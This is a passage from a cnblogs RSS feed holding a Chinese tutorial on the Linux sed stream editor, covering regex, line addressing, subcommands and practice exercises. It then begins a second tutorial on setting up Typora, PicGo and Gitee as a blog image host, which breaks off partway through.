<link>http://www.cnblogs.com/liwei0526vip/p/14328029.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liwei0526vip/p/14328029.html</guid>
<description>&lt;img src=&quot;https://cdn.jsdelivr.net/gh/chopin11/image001/linux-003.jpg&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;&lt;strong&gt;目录：&lt;/strong&gt;&lt;/p&gt;&lt;p class=&quot;toc&quot; id=&quot;tocid_0&quot;&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;https://www.cnblogs.com/liwei0526vip/p/14328029.html#h&quot;&gt;介绍&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;https://www.cnblogs.com/liwei0526vip/p/14328029.html#h-1&quot;&gt;工作原理&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;https://www.cnblogs.com/liwei0526vip/p/14328029.html#h-2&quot;&gt;正则表达式&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;https://www.cnblogs.com/liwei0526vip/p/14328029.html#h-3&quot;&gt;基本语法&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;https://www.cnblogs.com/liwei0526vip/p/14328029.html#h-4&quot;&gt;数字定址和正则定址&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;https://www.cnblogs.com/liwei0526vip/p/14328029.html#h-5&quot;&gt;基本子命令&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;https://www.cnblogs.com/liwei0526vip/p/14328029.html#h-6&quot;&gt;实战练习&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;h&quot;&gt;&lt;span&gt;介绍&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;熟悉 Linux 的同学一定知道大名鼎鼎的 Linux 三剑客，它们是 &lt;code&gt;grep&lt;/code&gt;、&lt;code&gt;awk&lt;/code&gt;、&lt;code&gt;sed&lt;/code&gt;，我们今天要聊的主角就是 &lt;code&gt;sed&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;sed 全名叫 &lt;code&gt;stream editor&lt;/code&gt;，流编辑器，用程序的方式来编辑文本，与 vim 的交互式编辑方式截然不同。它的功能十分强大，加上正则表达式的支持，可以进行大量的复杂文本的编辑操作。&lt;/p&gt;
&lt;p&gt;实际上 sed 提供的功能非常复杂，有专门的书籍讲解它。本文不会讲 sed 的全部东西，只会从 sed 的工作原理、常见使用方法等方面进行说明和讲解，同时也会给出大量的实践用例来帮助更好的理解 sed 基本用法。文中的知识点真正掌握后，足以应付平时工作中的基本需求。&lt;/p&gt;
&lt;p&gt;它有自己的使用场景：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;自动化程序中，不适合交互方式编辑的；&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;大批量重复性的编辑需求；&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;编辑命令太过复杂，在交互文本编辑器难以输入的情况；&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h-1&quot;&gt;&lt;span&gt;工作原理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;sed 作为一种非交互式编辑器，它使用预先设定好的编辑指令对输入的文本进行编辑，完成之后输出编辑结果。&lt;/p&gt;
&lt;p&gt;简单描述 sed 工作原理：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;sed 从输入文件中读取内容，每次处理一行内容，并把当前的一行内容存储在临时的缓冲区中，称为 &lt;code&gt;模式空间&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;span&gt;接着用 sed 命令处理缓存区中的内容；&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;处理完毕后，把缓存区的内容送往屏幕；&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;接着处理下一行；&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这样不断重复，直到文件末尾，文件内容并没有改变，除非你使用重定向输出或指定了 &lt;code&gt;i&lt;/code&gt; 参数&lt;/p&gt;
&lt;h2 id=&quot;h-2&quot;&gt;&lt;span&gt;正则表达式&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;sed 基本上就是在玩正则表达式模式匹配，所以，会玩 sed 的人，正则表达式能力一般都比较强。正则表达式内容相对较多，本节不会重点讲解正则表达式。&lt;/p&gt;
&lt;p&gt;为了能够让大部分朋友比较轻松地学习本文知识，这里还是简单介绍下正则表达式的基本内容。如果是专门做正则编程开发的，可以去买本正则的书籍来看。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（一）基本正则表达式&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;.&lt;/code&gt;，表示匹配任意一个字符，除了换行符，类似 Shell 通配符中的 &lt;code&gt;?&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;，表示前边字符有 0 个或多个；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.*&lt;/code&gt;，表示任意一个字符有 0 个或多个，也就是能匹配任意的字符；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^&lt;/code&gt;，表示行首，也就是每一行的开始位置，&lt;code&gt;^abc&lt;/code&gt; 匹配以 abc 开头的字符串；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&lt;/code&gt;，表示行尾，也就是每一行的结尾位置，&lt;code&gt;}$&lt;/code&gt; 匹配以大括号结尾的字符串；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{}&lt;/code&gt;，表示前边字符的数量范围，&lt;code&gt;{2}&lt;/code&gt;，表示重复 2 次，&lt;code&gt;{2,}&lt;/code&gt;重复至少 2次，&lt;code&gt;{2,4}&lt;/code&gt; 重复 2-4 次；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[]&lt;/code&gt;，括号中可以包含表示字符集的表达式，使用方法大概如下几种&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/chopin11/image001/sed-001.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;&lt;strong&gt;（二）扩展正则表达式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;扩展正则表达式使用频率上没有基本表达式那么高，但依然很重要，很多情况下没有扩展正则是搞不定的，sed 命令使用扩展正则时需要加上选项 &lt;code&gt;-r&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;?&lt;/code&gt;：表示前置字符有 0 个或 1 个；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt;：表示前置字符有 1 个或多个；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;|&lt;/code&gt;：表示匹配其中的一项即可；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;()&lt;/code&gt;：表示分组，&lt;code&gt;(a|b)b&lt;/code&gt; 表示可以匹配 ab 或 bb 子串，且命令表达式中可以通过 &lt;code&gt;\1&lt;/code&gt;、&lt;code&gt;\2&lt;/code&gt; 来表示匹配的变量&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{}&lt;/code&gt;：和基本正则中的大括号中意义相同，只不过使用时不用加 转义符号；&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h-3&quot;&gt;&lt;span&gt;基本语法&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;先介绍下 sed 的基本语法。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sed [选项] 'command' filename&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;选项部分，常见选项包括：&lt;code&gt;-n&lt;/code&gt;、&lt;code&gt;-e&lt;/code&gt;、&lt;code&gt;-i&lt;/code&gt;、&lt;code&gt;-f&lt;/code&gt;、&lt;code&gt;-r&lt;/code&gt; 等。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;command&lt;/strong&gt; 子命令格式：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[地址1, 地址2] [函数] [参数(标记)]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;选项简单说明：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;-n&lt;/code&gt;，表示安静模式。默认 sed 会把每行内容处理完毕后打印到屏幕上，加上选项后就不会输出到屏幕上。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-e&lt;/code&gt;，如果需要用 sed 对文本内容进行多种操作，则需要执行多条子命令来进行操作；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-i&lt;/code&gt;，默认 sed 只会处理模式空间的副本内容，不会直接修改文件，如果需要修改文件，就要指定 &lt;code&gt;-i&lt;/code&gt; 选项；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-f&lt;/code&gt;，如果命令操作比较多时，用 &lt;code&gt;-e&lt;/code&gt; 会有点力不从心，这时需要把多个子命令写入脚本文件，使用 &lt;code&gt;-f&lt;/code&gt; 选项指定执行该脚本；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-r&lt;/code&gt;：如果需要支持扩展正则表达式，那么需要添加 &lt;code&gt;-r&lt;/code&gt; 选项；&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h-4&quot;&gt;&lt;span&gt;数字定址和正则定址&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;默认情况下 sed 会对每一行内容进行匹配、处理、输出，有时候我们不需要对所有内容进行操作，只需要修改一种一部分，比如 1-10 行，偶数行，或包括 hello 字符串的行。&lt;/p&gt;
&lt;p&gt;这种情况下，就需要我们去定位特定的行来进行处理，而不是全部内容，这里把定位指定的行叫做 &lt;strong&gt;定址&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（一）数字定址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;数字定址其实就是通过数字去指定要操作的行，有几种方式，每种方式都有不同的应用场景。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'4s/hello/A/g'&lt;/span&gt; file.txt&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'2,4s/hello/A/g'&lt;/span&gt; file.txt&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'2,+4s/hello/A/g'&lt;/span&gt; file.txt&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'$s/hello/A/g'&lt;/span&gt; file.txt&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'1!s/hello/A/g'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（二）正则定址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;正则定址，是通过正则表达式的匹配来确定需要处理编辑哪些行，其它行就不需要处理&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'/hello/d'&lt;/span&gt; file.txt&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'/^$/d'&lt;/span&gt; file.txt&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'/^ts/,/^te/d'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（三）数字定址和正则定址混用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;数字定址和正则定址可以配合使用&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'1,/^ts/d'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;h-5&quot;&gt;&lt;span&gt;基本子命令&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;（一）替换子命令s&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;子命令 &lt;code&gt;s&lt;/code&gt; 为替换子命令，是平时 sed 使用最多的命令，因为支持正则表达式，功能很强大，基本可以替代 &lt;code&gt;grep&lt;/code&gt; 的基本用法。&lt;/p&gt;
&lt;p&gt;基本语法：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[address]s/pat/rep/flags&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;替换子命令基本用法&lt;/p&gt;
&lt;pre readability=&quot;7&quot;&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot; readability=&quot;8&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'s/hello/HELLO/'&lt;/span&gt; file.txt&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'s/hello/HELLO/g'&lt;/span&gt; file.txt&lt;/p&gt;&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'s/hello/A/2'&lt;/span&gt; file.txt&lt;/p&gt;&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'s/hello/A/2g'&lt;/span&gt; file.txt&lt;/p&gt;&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'s/^/#/g'&lt;/span&gt; file.txt&lt;/p&gt;&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'s/$/xxx/g'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;正则表达式的简单使用&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot; readability=&quot;2&quot;&gt;&lt;br/&gt;$ &lt;span class=&quot;hljs-built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;hello 123 world&quot;&lt;/span&gt; | sed -r &lt;span class=&quot;hljs-string&quot;&gt;'s/[a-z]+ [0-9]+ [a-z]+/A/'&lt;/span&gt;&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'s/&amp;lt;[^&amp;gt;]*&amp;gt;//g'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;多个匹配&lt;/p&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot; readability=&quot;4&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'1,3s/my/your/g; 3,$s/This/That/g'&lt;/span&gt; my.txt&lt;p&gt;&lt;br/&gt;$ sed -e &lt;span class=&quot;hljs-string&quot;&gt;'1,3s/my/your/g'&lt;/span&gt; -e &lt;span class=&quot;hljs-string&quot;&gt;'3,$s/This/That/g'&lt;/span&gt; my.txt&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用匹配到的变量&lt;/p&gt;
&lt;pre readability=&quot;6.5&quot;&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot; readability=&quot;7&quot;&gt;&lt;br/&gt;$ &lt;span class=&quot;hljs-built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;My name chopin&quot;&lt;/span&gt; | sed &lt;span class=&quot;hljs-string&quot;&gt;'s/name/&quot;&amp;amp;&quot;/'&lt;/span&gt;&lt;p&gt;&lt;br/&gt;$ &lt;span class=&quot;hljs-built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;hello,123,world&quot;&lt;/span&gt; | sed &lt;span class=&quot;hljs-string&quot;&gt;'s/\([^,]\),.*,\(.*\)/\1=\2/'&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其它几个常见用法&lt;/p&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot; readability=&quot;4&quot;&gt;&lt;br/&gt;$ sed -n &lt;span class=&quot;hljs-string&quot;&gt;'s/i/A/p'&lt;/span&gt; file.txt&lt;p&gt;&lt;br/&gt;$ sed -n &lt;span class=&quot;hljs-string&quot;&gt;'s/i/A/i'&lt;/span&gt; file.txt&lt;/p&gt;&lt;p&gt;&lt;br/&gt;$ sed -n &lt;span class=&quot;hljs-string&quot;&gt;'s/i/A/w b.txt'&lt;/span&gt; file.txt&lt;br/&gt;$ sed -n &lt;span class=&quot;hljs-string&quot;&gt;'s/i/A/'&lt;/span&gt; file.txt &amp;gt; b.txt&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意，sed 修改匹配到的内容后，默认行为是不保存到原文件，直接输出修改后模式空间的内容，如果要修改原文件需要指定 &lt;code&gt;-i&lt;/code&gt; 选项。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（二）追加行子命令a&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;子命令 &lt;code&gt;a&lt;/code&gt; 表示在指定行下边插入指定的内容行；&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'a A'&lt;/span&gt; file.txt&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'1,2a A'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（三）插入行子命令i&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;子命令 &lt;code&gt;i&lt;/code&gt; 和 &lt;code&gt;a&lt;/code&gt; 使用基本一样，只不过是在指定行上边插入指定的内容行&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'1,2i A'&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（四）替换行子命令c&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;子命令 &lt;code&gt;c&lt;/code&gt; 是表示把指定的行内容替换为自己需要的行内容&lt;/p&gt;
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot; readability=&quot;3&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'c A'&lt;/span&gt; file.txt&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'1,2c A'&lt;/span&gt; file.txt&lt;/p&gt;&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'1,2c A\nA'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（五）删除行子命令d&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;子命令 &lt;code&gt;d&lt;/code&gt; 表示删除指定的内容行，这个很容理解&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot; readability=&quot;2&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'1,3d'&lt;/span&gt; file.txt&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'/^This/d'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（六）设置行号子命令=&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;子命令 &lt;code&gt;=&lt;/code&gt;，可以将行号打印出来&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot; readability=&quot;2&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'1,2='&lt;/span&gt; file.txt&lt;p&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'='&lt;/span&gt; file.txt | sed &lt;span class=&quot;hljs-string&quot;&gt;'N;s/\n/\t/'&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（七）子命令N&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;子命令 &lt;code&gt;N&lt;/code&gt;，把下一行内容纳入当缓存区做匹配，注意的是第一行的 &lt;code&gt;\n&lt;/code&gt; 仍然保留&lt;/p&gt;
&lt;p&gt;其实就是当前行的下一行内容也读进缓存区，一起做匹配和修改，举个例子吧&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;&lt;br/&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'N;s/\n//'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;哈哈，是不是很简单？&lt;/p&gt;
&lt;h2 id=&quot;h-6&quot;&gt;&lt;span&gt;实战练习&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;掌握了上边的基础命令操作后，基本上可以满足平时 &lt;code&gt;95%&lt;/code&gt; 的需求啦。sed 还有一些高级概念，比如：模式空间、保持空间、高级子命令、分支和测试等，平时使用概率非常小，本文就暂不讲解了，有需要的同学可以私信我一起交流学习哈。&lt;/p&gt;
&lt;p&gt;学习了这么多基础用法后，只要你勤加练习，多实践，多使用，一定可以得心应手，极大提高的文本处理效率。下边我简单再给出一些比较实用的操作实践，希望对大家有帮助。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;1.&lt;/em&gt; 删除文件每行的第二个字符&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;$ sed -r &lt;span class=&quot;hljs-string&quot;&gt;'s/(.)(.)(.*)$/\1\3/'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;2.&lt;/em&gt; 交换每行的第一个字符和第二个字符&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;$ sed -r ‘s/(.)(.)(.*)/\2\1\3/’ file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;3.&lt;/em&gt; 删除文件中所有的数字&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'s/[0-9]//g'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;4.&lt;/em&gt; 用制表符替换文件中出现的所有空格&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;$ sed -r &lt;span class=&quot;hljs-string&quot;&gt;'s/ +/\t/g'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;5.&lt;/em&gt; 把所有大写字母用括号&lt;strong&gt;()&lt;/strong&gt;括起来&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;$ sed -r &lt;span class=&quot;hljs-string&quot;&gt;'s/([A-Z])/(\1)/g'&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;6.&lt;/em&gt; 隔行删除&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'0~2{d}'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;7.&lt;/em&gt; 删除所有空白行&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;sh language-sh hljs bash&quot;&gt;$ sed &lt;span class=&quot;hljs-string&quot;&gt;'/^$/d'&lt;/span&gt; file.txt&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;好了，以上是 sed 命令常用的全部内容。想要熟练掌握，只有多实践，多练习正则表达式的使用，一旦熟练掌握后，相信在日后工作中一定会产生巨大作用的。&lt;/p&gt;
&lt;p&gt;谢谢大家，我是&lt;strong&gt;肖邦&lt;/strong&gt;，欢迎关注后续的精彩内容。&lt;/p&gt;
&lt;p&gt;推荐阅读：&lt;/p&gt;
&lt;img src=&quot;https://cdn.jsdelivr.net/gh/chopin11/image001/bcxy-001.jpg&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;</description>
<pubDate>Mon, 25 Jan 2021 15:18:00 +0000</pubDate>
<dc:creator>肖邦linux</dc:creator>
<og:description>目录： 介绍工作原理正则表达式基本语法数字定址和正则定址基本子命令实战练习 介绍 熟悉 Linux 的同学一定知道大名鼎鼎的 Linux 三剑客，它们是 grep、awk、sed，我们今天要聊的主角就</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/liwei0526vip/p/14328029.html</dc:identifier>
</item>
<item>
<title>Typora+PicGo+Gitee打造博客图床 - noor9</title>
<link>http://www.cnblogs.com/xp-thebest/p/14328023.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xp-thebest/p/14328023.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;​ 自己一直使用的是&lt;code&gt;Typora&lt;/code&gt;来写博客，但比较麻烦的是图片粘贴上去后都是存储到了本地，但令人苦恼的是写好了之后放到博客园等地图片不能直接访问，但如今&lt;code&gt;Typora&lt;/code&gt;已经支持图片上传，所以搞了一波图片上传到&lt;code&gt;Gitee&lt;/code&gt;，可以直接访问，记录如下。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;本篇环境：Gitee + Typora + PicGo + Node.js&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;步骤&quot;&gt;步骤&lt;/h2&gt;
&lt;p&gt;​ 本文不再介绍 node.js 相关安装内容&lt;/p&gt;
&lt;ol readability=&quot;8.9520766773163&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;将Typora升级到最新版&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;在Gitee上创建一个&lt;strong&gt;公有&lt;/strong&gt;仓库&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125225328804.png&quot; alt=&quot;新建仓库&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;生成私人令牌&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125225440018.png&quot; alt=&quot;生成私人令牌&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125225603497.png&quot; alt=&quot;私人令牌&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125225743585.png&quot; alt=&quot;创建私人令牌&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（注：令牌只会显示一次，记得复制后先保存至一处，待会会用到）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-0.92857142857143&quot;&gt;
&lt;p&gt;下载 &lt;a href=&quot;https://github.com/Molunerfinn/picgo/releases&quot; target=&quot;_blank&quot;&gt;PicGo&lt;/a&gt;，下载后缀.exe的安装版本，下载好安装即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125224715266.png&quot; alt=&quot;PicGo下载&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;安装完成后，在这里搜索 gitee，安装这两个插件(需要&lt;code&gt;node.js&lt;/code&gt;环境)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125225838599.png&quot; alt=&quot;插件安装&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
